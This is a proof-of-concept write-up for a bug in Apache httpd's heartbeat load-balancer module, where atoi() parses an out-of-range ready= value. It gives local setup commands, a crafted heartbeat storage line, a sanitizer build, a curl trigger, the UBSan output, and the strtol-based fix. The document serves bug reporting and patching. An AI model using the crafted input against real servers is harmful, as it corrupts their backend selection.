# PoC 154 — Unbounded `ready` Conversion via `atoi`

`readfile_heartbeats()` parses `ready` with `atoi()`. Numeric values
outside `int` range invoke C undefined behavior before any later
balancing logic runs.

## Setup

Reuse the heartbeat-balancer config from PoC 153, but craft a heartbeat
storage line whose `ready=` value exceeds `INT_MAX`:

```bash
mkdir -p /tmp/httpd-poc-154 && cd /tmp/httpd-poc-154
cat > heartbeats <<'EOF'
127.0.0.1:18001&ready=99999999999999999999&busy=0&lastseen=1
EOF
```

`httpd.conf` (only the relevant additions):

```apache
LoadModule lbmethod_heartbeat_module modules/mod_lbmethod_heartbeat.so
HeartbeatStorage /tmp/httpd-poc-154/heartbeats

<Proxy "balancer://hbcluster">
    BalancerMember "http://127.0.0.1:18001"
    ProxySet lbmethod=heartbeat
</Proxy>
ProxyPass        "/lb" "balancer://hbcluster"
ProxyPassReverse "/lb" "balancer://hbcluster"
```

A trivial backend:

```bash
python3 -m http.server 18001 --bind 127.0.0.1 &
```

Build httpd with UndefinedBehaviorSanitizer to make the UB visible:

```bash
CFLAGS="-fsanitize=undefined -fno-omit-frame-pointer -O1 -g" \
LDFLAGS="-fsanitize=undefined" \
./configure --enable-proxy --enable-lbmethod-heartbeat \
            --enable-mods-shared=all --prefix=/tmp/httpd-poc-154/install
make && make install
```

## Trigger

```bash
UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=0 \
  /tmp/httpd-poc-154/install/bin/httpd \
    -f /tmp/httpd-poc-154/httpd.conf -X &
sleep 1
curl -s http://127.0.0.1:8080/lb/index.html >/dev/null
```

## Observed effect

* The UBSan report points at the `atoi(val)` line in
  `readfile_heartbeats()`:
  ```
  mod_lbmethod_heartbeat.c:187:33: runtime error: signed integer
  result of conversion is outside the range of representable values
  of type 'int'
      #0 ... in readfile_heartbeats
      #1 ... in read_heartbeats
      #2 ... in find_best_hb
  ```
* `server->ready` ends up implementation-defined (commonly `INT_MAX` or
  `-1`), which then propagates into `openslots`, breaking weighted
  selection deterministically.
* Replacing `atoi()` with the patched `strtol()` + `ERANGE` /
  `INT_MIN`..`INT_MAX` guard makes the malformed line silently skipped.
